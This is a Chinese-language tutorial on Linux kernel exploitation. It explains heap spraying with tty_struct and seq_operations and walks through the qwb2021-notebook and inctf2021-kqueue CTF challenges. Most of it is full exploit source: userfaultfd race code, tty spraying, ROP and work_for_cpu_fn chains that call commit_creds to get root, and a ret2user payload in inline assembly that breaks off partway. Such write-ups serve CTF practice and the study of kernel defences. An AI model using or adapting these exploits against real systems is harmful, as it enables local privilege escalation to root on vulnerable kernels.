# 教你学内核-tty,seq

## 背景知识

### 堆喷射

堆喷是啥？

堆喷射（Heap Spraying），通过大量重复的操作，申请多个相同的堆块或者构造大量指针从而提高碰撞到该堆块或利用到该指针的概率。

具体可以是存在一个 uaf 保存了一个已经 free 掉的指针，通过申请大量相同的结构体，从而提高该指针命中结构体的概率。

### tty 设备结构体

当我们打开 tty 设备时内核中便会创建一个 tty_struct，也就是说，打开 `/dev/ptmx` 会在内核中分配一个 tty_struct 结构体，相应地当我们将其关闭时该结构体便会被释放回 slab/slub 中

tty_struct  结构体定义如下

```c
struct tty_struct {
    int    magic;
    struct kref kref;
    struct device *dev;    /* class device or NULL (e.g. ptys, serdev) */
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;

    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;

    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    char name[64];
    unsigned long flags;
    int count;
    struct winsize winsize;        /* winsize_mutex */

    struct {
        spinlock_t lock;
        bool stopped;
        bool tco_stopped;
        unsigned long unused[0];
    } __aligned(sizeof(unsigned long)) flow;

    struct {
        spinlock_t lock;
        struct pid *pgrp;
        struct pid *session;
        unsigned char pktstatus;
        bool packet;
        unsigned long unused[0];
    } __aligned(sizeof(unsigned long)) ctrl;

    int hw_stopped;
    unsigned int receive_room;    /* Bytes free for queue */
    int flow_change;

    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;        /* protects tty_files list */
    struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;

/* Each of a tty's open files has private_data pointing to tty_file_private */
struct tty_file_private {
    struct tty_struct *tty;
    struct file *file;
    struct list_head list;
};

/* tty magic number */
#define TTY_MAGIC        0x5401
```

其中定义了结构体 魔数 TTY_MAGIC 0x5401，可以通过这个魔数判断该堆块是否是tty结构体，另外结构体中有一个函数表 *tty_operations* ，tty_op 为一个内核地址，可以通过它来泄露内核地址，我们在使用 read ioctl等操作的时候，也会通过 tty_op 里保存的函数来实现对应的功能

tty_operations 结构体定义如下

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    unsigned int (*write_room)(struct tty_struct *tty);
    unsigned int (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
    int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

在使用 write 时，rdi寄存器的值为其结构体本身，因此可以通过使用 gadget 进行栈迁移

![image-20221024125225175](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024125225175.png)

调用 ioctl 时 ，rdi寄存器为结构体本身，  rcx 寄存器为 tty_operations 

![image-20221024130636724](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024130636724.png)

### seq 序列文件接口

序列文件接口（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口

```c
struct seq_file {
    char *buf;
    size_t size;
    size_t from;
    size_t count;
    size_t pad_until;
    loff_t index;
    loff_t read_pos;
    struct mutex lock;
    const struct seq_operations *op;
    int poll_event;
    const struct file *file;
    void *private;
};
```

其中 seq_operations 结构体动态分配，该结构体只有4个函数指针，大小仅为 0x20 ，其中在 read 时会通过调用链来调用 start 指针

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

我们打开 `proc/self/stat` 文件能分配到新的 seq_operations 结构体

## 题目讲解

### qwb2021-notebook

#### 漏洞分析

启动脚本如下

```shell
#!/bin/sh
stty intr ^]
exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append "loglevel=3 console=ttyS0 oops=panic panic=1 kaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2>/dev/null -s
```

保护全开，并且是多核，内核版本 4.15.8 ，因此可以使用 userfaultfd

模块为经典菜单

ioctl程序如下，其中gift可以白给出堆地址，程序很多地方用了锁，但是很多锁没啥意义。。

![image-20221024120210536](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024120210536.png)

edit如下

![image-20221024120122050](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024120122050.png)

使用了 realloc，其 realloc 和用户态的类似，size 为 0 时可以释放堆块，我们可以看到，程序中有很多地方都有 copy_from_user(name, v4, 0x100LL); 这其实是方便我们使用 userfaultfd 机制的，因此程序可以卡在刚 free 后的地方，而后续如果没有继续运行下去就会造成一个 uaf

add 同样也用了读锁，各个读锁，因此 edit 卡着的过程中 是可以使用 add 的

而 read write 都没有用到锁

#### 漏洞利用

1. 使用 userfaultfd 申请缺页内存，那么在内核操作访问到该内存的时候就会发生缺页卡住。

2. 申请满 pool ，随后使用 realloc 重分配到 0x2e0 也就是 tty 结构体的大小；
3. 开多线程使用 userfaultfd 将 pool 里的堆块全部清成 uaf ；
4. 堆喷 tty 结构体，此时应该有几个 tty 结构体的指针在 pool 里；
5. 再次开多线程使用 userfaultfd 卡 add 将 pool 里的 size 改成正常大小；
6. 遍历 pool 找出 tty 结构体泄露出内核地址，申请两个内核堆块用来伪造 tty_operations 以及布置rop；
7. 修改 tty_operations 将其劫持到伪造的 tty_operations ，栈迁移到 rop 完成利用；还可以用另一种方法 ，便是使用 work_for_cpu_fn 函数，多次调用 提权的两个函数完成利用。

##### rop法

考虑到在对 tty 结构体调用 write 函数时 rdi 为结构体本身，因此找一个从 rdi 到 rsp 的 gadget

```python
0xffffffff81045833 <lmce_supported+35>:	mov    rdi,rax
0xffffffff81045836 <lmce_supported+38>:	xor    eax,eax
0xffffffff81045838 <lmce_supported+40>:	cmp    rdi,0x9000000
0xffffffff8104583f <lmce_supported+47>:	je     0xffffffff81045843 <lmce_supported+51>
0xffffffff81045841 <lmce_supported+49>:	pop    rbp
0xffffffff81045842 <lmce_supported+50>:	ret
```

此时迁移的 tty 结构体上可控空间很小，因此进行第二次栈迁移，考虑到此时 rsp 下方有 tty_operations ，因此使用 pop rbp 迁移过去，最后再使用 leave ret 迁到 伪造 rop 的地方即可

userfaultfd + tty_struct->write + 堆喷+ rop

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>
#include "kernelpwn.h"

#define TTY_STRUCT_SIZE 0x2e0
int fd = 0;
char *mem;

size_t commit_creds = 0xa9b40;
size_t prepare_kernel_cred = 0xa9ef0;
size_t push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret = 0x43f4e1;
size_t swapgs_restore_regs_and_return_to_usermode = 0xa00929;
size_t kpti_trampoline = 0;
size_t pop_r12_pop_rbp_ret = 0x2061;
size_t leave_ret = 0x2805;
size_t pop_rdi_ret = 0x7115;
size_t pop_rdx_ret = 0x358842;
size_t mov_rdi_rax_cmp_pop_rbp_ret = 0x45833;

// 0xffffffff81045833 <lmce_supported+35>:	mov    rdi,rax
// 0xffffffff81045836 <lmce_supported+38>:	xor    eax,eax
// 0xffffffff81045838 <lmce_supported+40>:	cmp    rdi,0x9000000
// 0xffffffff8104583f <lmce_supported+47>:	je     0xffffffff81045843 <lmce_supported+51>
// 0xffffffff81045841 <lmce_supported+49>:	pop    rbp
// 0xffffffff81045842 <lmce_supported+50>:	ret

struct args{
    size_t index;
    size_t size;
    char *data;
} typedef args;


void set_offset(){
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;
    push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret += vmlinux_base;
    pop_r12_pop_rbp_ret += vmlinux_base;
    leave_ret += vmlinux_base;
    mov_rdi_rax_cmp_pop_rbp_ret += vmlinux_base;
    pop_rdi_ret += vmlinux_base;
    pop_rdx_ret += vmlinux_base;
    swapgs_restore_regs_and_return_to_usermode += vmlinux_base;
    kpti_trampoline  = swapgs_restore_regs_and_return_to_usermode +22;

    info("kpti_trampoline" , kpti_trampoline);
    
}

void add(size_t index , size_t size , char *data){
    args arg;
    arg.index = index;
    arg.size = size;
    arg.data = data;

    ioctl(fd , 0x100 , &arg );
}

void * block_add(void *index){
    args arg;
    arg.index = *(size_t*)index;
    arg.size = 0x50;
    arg.data =(char *) mem;

    ioctl(fd , 0x100 , &arg );
    error("error");
}

void * block_edit(void *index){
    args arg;
    arg.index = *(size_t*)index;
    arg.size = 0;
    arg.data =(char *) mem;

    ioctl(fd , 0x300 , &arg );
    error("error");
}

void delete(size_t index){
    args arg;
    arg.index = index;
    arg.size = 0;
    arg.data = 0;

    int res = ioctl(fd , 0x200 , &arg );
    if(!res){
        info("Detele a chunk" , 0);
    }else{
        error("Can not detele chunk");
    }
}

void edit(size_t index , size_t size , char *data){
    args arg;
    arg.index = index;
    arg.size = size;
    arg.data = data;

    int res = ioctl(fd , 0x300, &arg );
}

void leak( char *data){
    args arg;
    arg.index = 0;
    arg.size = 0;
    arg.data = data;

    int res = ioctl(fd , 0x64 , &arg );
}

void note_read(size_t index, char *data ){
    int res = read(fd , data , index);
}

void note_write(size_t index, char *data){
    int res = write(fd , data , index);
    if(!res){
        info("Edit chunk data" , 0);
    }else{
        error("Can not Edit chunk data");
    }
}

size_t get_mod_addr()
{
    FILE* fd =  fopen("/tmp/moduleaddr", "r");
    char buf[0x100];
    char buffer[0x100];
    size_t leak = 0;
    fgets(buf, 0x30, fd);

    sscanf(buf , "%s%s%s%s%s%lx" ,buffer,buffer,buffer,buffer,buffer, &leak);
    info("leak" ,leak);
}

void main(){
    
    int tty_fd[0x100] = {0};
    int tty_idx = -1 , fake_tty_op_idx , rop_idx;

    char buf[0x1000] = {0};
    char rop[0x1000] = {0};
    char tty_buf[0x1000] = {0};

    size_t *data = (size_t *)buf;
    size_t *tty_data = (size_t *)tty_buf;
    size_t *rop_data = (size_t *)rop;

    size_t heap_addr = 0 , tty_addr = 0 , fake_tty_op_addr = 0 ,rop_addr ;
    pthread_t tmp_t, add_t, edit_t;

    long int *nums = (long int *) malloc(8*0x10);
    for (int i = 0; i < 0x10; i++)
        nums[i] = i;

    save_status();
    // signal(SIGSEGV, shell);

    fd = open("/dev/notebook" , O_RDWR);

    mem = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault((size_t) mem , 0x1000 );
    sleep(1);

    for (int i = 0;i<0x10;i++){
        add(i , 0x20 , buf);
        edit(i , TTY_STRUCT_SIZE , buf);
    }

    for (int i = 0; i < 0x10; i++)
        pthread_create( &edit_t , NULL , block_edit , (void *)(nums+i));

    sleep(1);

    for (int i = 0; i < 0x80; i++)
        tty_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    for (int i = 0; i < 0x10; i++)
        pthread_create( &add_t , NULL , block_add , (void *)(nums+i));

    sleep(1);

    for (int i = 0; i < 0x10; i++){
        note_read(i , tty_buf);
        if ((int)tty_data[0] == 0x5401 ){
            tty_idx = i;
            break;
        }
    }

    if(tty_idx == -1) {
        error("Can not find tty");
        exit(-1);
    }

    fake_tty_op_idx = (tty_idx + 1)%0x10;
    rop_idx = (tty_idx + 2)%0x10;

    vmlinux_base = (tty_data[3] & 0xfffffffffffff000) - 0xe8e000;

    info("tty_idx" , tty_idx );
    info("fake_tty_op_idx" , fake_tty_op_idx );
    info("rop_idx" , rop_idx );
    info("vmlinux_base" , vmlinux_base );

    set_offset();

    edit(fake_tty_op_idx , 0x200 , buf);
    edit(rop_idx , 0x200 , rop);

    leak(buf);

    tty_addr = data[2*tty_idx];
    fake_tty_op_addr = data[2*fake_tty_op_idx];
    rop_addr = data[2*rop_idx];
    
    info("tty_addr" , tty_addr);
    info("fake_tty_op_addr" , fake_tty_op_addr);
    info("rop_addr" , rop_addr);

    tty_data[1] = pop_r12_pop_rbp_ret;
    tty_data[3] = fake_tty_op_addr;
    tty_data[4] = leave_ret;

    for (int i = 0; i < 0x20; i++)
        data[i] = push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret;

    data[0] = rop_addr;
    data[1] = leave_ret;

    int i = 0;
    rop_data[i++] = 0;
    rop_data[i++] = pop_rdi_ret;
    rop_data[i++] = 0;
    rop_data[i++] = prepare_kernel_cred;
    rop_data[i++] = pop_rdx_ret;
    rop_data[i++] = pop_rdi_ret+1;
    rop_data[i++] = mov_rdi_rax_cmp_pop_rbp_ret;
    rop_data[i++] = 0;
    rop_data[i++] = commit_creds;

    rop_data[i++] = kpti_trampoline;
    rop_data[i++] = 0; // rdi
    rop_data[i++] = 0;
    rop_data[i++] = (size_t )shell;
    rop_data[i++] = user_cs;
    rop_data[i++] = user_rflags;
    rop_data[i++] = user_sp;
    rop_data[i++] = user_ss;

    note_write(tty_idx , tty_buf);
    note_write(fake_tty_op_idx , buf);
    note_write(rop_idx, rop);

    // getchar();
    // 0xffffffff8143f4e1

    for (int i = 0;i<0x80;i++)
        write(tty_fd[i] , buf , 114);

    // getchar();
    // 可以通过这种方法下断点来查看堆布局 pty_write

}
```

##### work_for_cpu_fn 函数利用法

此方法就简单很多了

```c
struct work_for_cpu {
    struct work_struct work;
    long (*fn)(void *);
    void *arg;
    long ret;
};
static void work_for_cpu_fn(struct work_struct *work)
{
    struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
    wfc->ret = wfc->fn(wfc->arg);
}

```

此函数直接将 rdi+0x20 的地方当成函数执行，将 rdi+0x28 当成第一个参数，将  rdi+0x30 当成返回值，因此可以完成一套很丝滑的函数调用

userfaultfd + tty_struct->ioctl + 堆喷 + work_for_cpu_fn 

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>
#include "kernelpwn.h"

#define TTY_STRUCT_SIZE 0x2e0
int fd = 0;
char *mem;

size_t commit_creds = 0xa9b40;
size_t prepare_kernel_cred = 0xa9ef0;
size_t work_for_cpu_fn = 0x9eb90;



struct args{
    size_t index;
    size_t size;
    char *data;
} typedef args;


void set_offset(){
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;
    work_for_cpu_fn += vmlinux_base;

    info("work_for_cpu_fn" , work_for_cpu_fn);
}

void add(size_t index , size_t size , char *data){
    args arg;
    arg.index = index;
    arg.size = size;
    arg.data = data;

    ioctl(fd , 0x100 , &arg );
}

void * block_add(void *index){
    args arg;
    arg.index = *(size_t*)index;
    arg.size = 0x50;
    arg.data =(char *) mem;

    ioctl(fd , 0x100 , &arg );
    error("error");
}

void * block_edit(void *index){
    args arg;
    arg.index = *(size_t*)index;
    arg.size = 0;
    arg.data =(char *) mem;

    ioctl(fd , 0x300 , &arg );
    error("error");
}

void delete(size_t index){
    args arg;
    arg.index = index;
    arg.size = 0;
    arg.data = 0;

    int res = ioctl(fd , 0x200 , &arg );
    if(!res){
        info("Detele a chunk" , 0);
    }else{
        error("Can not detele chunk");
    }
}

void edit(size_t index , size_t size , char *data){
    args arg;
    arg.index = index;
    arg.size = size;
    arg.data = data;

    int res = ioctl(fd , 0x300, &arg );
}

void leak( char *data){
    args arg;
    arg.index = 0;
    arg.size = 0;
    arg.data = data;

    int res = ioctl(fd , 0x64 , &arg );
}

void note_read(size_t index, char *data ){
    int res = read(fd , data , index);
}

void note_write(size_t index, char *data){
    int res = write(fd , data , index);
    if(!res){
        info("Edit chunk data" , 0);
    }else{
        error("Can not Edit chunk data");
    }
}

size_t get_mod_addr()
{
    FILE* fd =  fopen("/tmp/moduleaddr", "r");
    char buf[0x100];
    char buffer[0x100];
    size_t leak = 0;
    fgets(buf, 0x30, fd);

    sscanf(buf , "%s%s%s%s%s%lx" ,buffer,buffer,buffer,buffer,buffer, &leak);
    info("leak" ,leak);
}

void main(){
    
    int tty_fd[0x100] = {0};
    int tty_idx = -1 , fake_tty_op_idx ;

    char buf[0x1000] = {0};
    char tty_buf[0x1000] = {0};

    size_t *data = (size_t *)buf;
    size_t *tty_data = (size_t *)tty_buf;

    size_t heap_addr = 0 , tty_addr = 0 , fake_tty_op_addr = 0 ,rop_addr ;
    pthread_t tmp_t, add_t, edit_t;

    long int *nums = (long int *) malloc(8*0x10);
    for (int i = 0; i < 0x10; i++)
        nums[i] = i;

    save_status();

    fd = open("/dev/notebook" , O_RDWR);

    mem = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault((size_t) mem , 0x1000 );
    sleep(1);

    for (int i = 0;i<0x10;i++){
        add(i , 0x20 , buf);
        edit(i , TTY_STRUCT_SIZE , buf);
    }

    for (int i = 0; i < 0x10; i++)
        pthread_create( &edit_t , NULL , block_edit , (void *)(nums+i));

    sleep(1);

    for (int i = 0; i < 0x80; i++)
        tty_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    for (int i = 0; i < 0x10; i++)
        pthread_create( &add_t , NULL , block_add , (void *)(nums+i));

    sleep(1);

    for (int i = 0; i < 0x10; i++){
        note_read(i , tty_buf);
        if ((int)tty_data[0] == 0x5401 ){
            tty_idx = i;
            break;
        }
    }

    if(tty_idx == -1) {
        error("Can not find tty");
        exit(-1);
    }

    fake_tty_op_idx = (tty_idx + 1)%0x10;
    vmlinux_base = (tty_data[3] & 0xfffffffffffff000) - 0xe8e000;

    info("tty_idx" , tty_idx );
    info("fake_tty_op_idx" , fake_tty_op_idx );
    info("vmlinux_base" , vmlinux_base );

    set_offset();

    edit(fake_tty_op_idx , 0x200 , buf);

    leak(buf);

    tty_addr = data[2*tty_idx];
    fake_tty_op_addr = data[2*fake_tty_op_idx];
    
    info("tty_addr" , tty_addr);
    info("fake_tty_op_addr" , fake_tty_op_addr);

    tty_data[3] = fake_tty_op_addr;
    tty_data[4] = prepare_kernel_cred;
    tty_data[5] = 0;

    for (int i = 0; i < 0x40; i++)
        data[i] = work_for_cpu_fn ;

    note_write(tty_idx , tty_buf);
    note_write(fake_tty_op_idx , buf);

    // getchar();
    for (int i = 0;i<0x80;i++)
        ioctl(tty_fd[i] , 114 , 114);

    note_read(tty_idx , buf);
    size_t root_struct = data[6];

    tty_data[3] = fake_tty_op_addr;
    tty_data[4] = commit_creds;
    tty_data[5] = root_struct;
    tty_data[6] = root_struct;

    info("root_struct" , root_struct);

    note_write(tty_idx , tty_buf);

    for (int i = 0;i<0x80;i++)
        ioctl(tty_fd[i] , 114 , 114);

    shell();
    // getchar();
    // 可以通过这种方法下断点来查看堆布局 pty_write

}
```

两种方法都可以提权成功，但是成功率都挺低的

![image-20221024135014621](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024135014621.png)

![image-20221024134357599](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024134357599.png)

### inctf2021-kqueue

#### 漏洞分析

启动脚本如下

```shell
exec qemu-system-x86_64 \
    -cpu kvm64 \
    -m 512 \
    -nographic \
    -kernel "bzImage" \
    -append "console=ttyS0 panic=-1 pti=off kaslr quiet" \
    -monitor /dev/null \
    -initrd "./rootfs.cpio" \
    -net user \
    -net nic \
    -s
```

其中只开启了 kaslr 保护，因此可以使用 ret2user 手法

其漏洞发生在此处

```c
static noinline long create_kqueue(request_t request){
    long result = INVALID;
	
    ...
    
    /* Check if multiplication of 2 64 bit integers results in overflow */
    ull space = 0;
    if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
        err("[-] Integer overflow");

    /* Size is the size of queue structure + size of entry * request entries */
    ull queue_size = 0;
    if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
        err("[-] Integer overflow");

    /* Total size should not exceed a certain limit */
    if(queue_size>sizeof(queue) + 0x10000)
        err("[-] Max kqueue alloc limit reached");

    ...
}
```

__builtin_umulll_overflow 虽然可以检测计算是否发生溢出，但是却忽视了 request.max_entries 可控，加1便可以直接溢出成 0 ，因此 space 被计算成了 0 ，然而 sizeof(queue) 大小为 0x20 ，那么 queue_size 就变成了0x20，所以会分配 0x20 大小的堆块，但此时 max_entries 变成了一个很大的数，接下来观察下面的 save 

```c
static noinline long save_kqueue_entries(request_t request){

    ...

    /* Check if number of requested entries exceed the existing entries */
    if(request.max_entries < 1 || request.max_entries > queue->max_entries)
        err("[-] Invalid entry count");

    /* Allocate memory for the kqueue to be saved */
    char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));

    /* Each saved entry can have its own size */
    if(request.data_size > queue->queue_size)
        err("[-] Entry size limit exceed");

    /* Copy main's queue's data */
    if(queue->data && request.data_size)
        validate(memcpy(new_queue,queue->data,request.data_size));
    else
        err("[-] Internal error");
    new_queue += queue->data_size;

    /* Get to the entries of the kqueue */
    queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);

    /* copy all possible kqueue entries */
    uint32_t i=0;
    for(i=1;i<request.max_entries+1;i++){
        if(!kqueue_entry || !kqueue_entry->data)
            break;
        if(kqueue_entry->data && request.data_size)
            validate(memcpy(new_queue,kqueue_entry->data,request.data_size));
        else
            err("[-] Internal error");
        kqueue_entry = kqueue_entry->next;
        new_queue += queue->data_size;
    }

    /* Mark the queue as saved */
    isSaved[request.queue_idx] = true;
    return 0;
}
```

这边首先进行过了一些判断，因为 max_entries 被变成了一个很大的数，因此这些检查是随便过的，随后，会分配一个 queue_size 大小的堆块，之后将原堆块的数据都复制一些进去，而此时的 queue_size 又很小，只有 0x20 大小，所以此时从 queue 复制的 第二份数据就会发生溢出，那么哪里来的第二份数据呢，这就需要弄一下堆风水了，让 queue 下面刚好是别人的 data 域

然而在看头文件的时候发现

```c
static long err(char* msg){
    printk(KERN_ALERT "%s\n",msg);
    return -1;
}
```

是个假 error，没有直接退出而是返回..

#### 漏洞利用

查看数据结构可以发现 data 域是0x20字节，因此为保证可以发生溢出，可以先将 cache 里的 0x20 大小的堆块清掉，随后申请的0x20大小的堆块就会连在一起了，随后在申请一个 max_entries 大于1的堆块，此时他的 data 域都是是连在一起的，这个时候再申请一个 错误的结构体（即0x20大小的queue），这个结构体就会刚好在这两个 data 的上面，所以修改此 data 就相当于修改 queue 的next。

可以看到此时假 queue 的下面为我们伪造的 kqueue_entry ，data 域指向了我们 malloc 出的内存

![image-20221024135647103](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024135647103.png)

因为本题除了 kaslr 啥都没开，所以可以直接访问到用户的数据，可以直接将next改成 用户态malloc 出来的地址。

随后堆喷 seq_operations 结构体，此结构体为 0x20 大小，并且其四个指针之一在 read 的时候会调用到，之后再 save 那个错误的堆块，此时会申请 0x20 大小的堆块，并且必会在 seq_operations 结构体的上方，因此就会将某一 seq_operations 结构体的指针给覆盖，覆盖成用户态的函数即可。

此时已经在 某个 seq_operations 的上方覆盖成了 0x61，下一步 memcpy 就会复制到那个 seq_operations 处了

![image-20221024141326510](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141326510.png)

![image-20221024141516630](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141516630.png)

最后就是喜闻乐见的 ret2user 了

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>

size_t vmlinux_base = 0xffffffff81000000;
size_t commit_creds = 0x8c140;
size_t prepare_kernel_cred = 0x8c580;
size_t user_cs, user_ss, user_rflags, user_sp , user_rip;
int fd = 0;

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

#define INVALID      -1
#define NOT_EXISTS   -3
#define MAX_QUEUES    5
#define MAX_DATA_SIZE 0x20

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

typedef struct queue_entry{
    uint16_t idx;
    char *data;
    char *next;
}queue_entry;

void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m\033[35m\033[1m%#lx \033[0m\n", s, address);
    else printf("\033[34m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (size_t)shell;
    info("status saved!",0);
}

void root(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rsi, rsp;"
        "mov rsi, [rsi + 8];"
        "sub rsi, 0x201179;"
        "mov r12 , rsi;"
        "mov r13 , rsi;"
        "add r12 , prepare_kernel_cred ;"
        "add r13 , commit_creds ;"

        "mov rdi, 0 ;"
        "call r12 ;"
        "mov rdi, rax ;"
        "call r13 ;"

        "swapgs;"
        "mov r14, user_ss;"
        "push r14;"
        "mov r14, user_sp;"
        "push r14;"
        "mov r14, user_rflags;"
        "push r14;"
        "mov r14, user_cs;"
        "push r14;"
        "mov r14, user_rip;"
        "push r14;"
        "iretq;"
        ".att_syntax;"
    );
}

void create(uint32_t max_entries , uint16_t data_size){
    request_t request;
    request.max_entries = max_entries;
    request.data_size = data_size;

    ioctl(fd , CREATE_KQUEUE , &request);
}

void delete( uint16_t queue_idx){
    request_t request;
    request.queue_idx = queue_idx;

    ioctl(fd , DELETE_KQUEUE , &request);
}

void save( uint16_t queue_idx , uint32_t max_entries ,uint16_t data_size ){
    request_t request;
    request.max_entries = max_entries;
    request.queue_idx = queue_idx;
    request.data_size = data_size;

    ioctl(fd , SAVE , &request);
}

void edit( uint16_t queue_idx , uint16_t entry_idx , char *data){
    request_t request;
    request.queue_idx = queue_idx;
    request.entry_idx = entry_idx;
    request.data = data;

    ioctl(fd , EDIT_KQUEUE , &request);
}

int main(){
    
    size_t buffer[0x100] = {0};
    int seq_fd[0x100] = {0};

    save_status();

    queue_entry *entry = (queue_entry *) malloc(0x20);
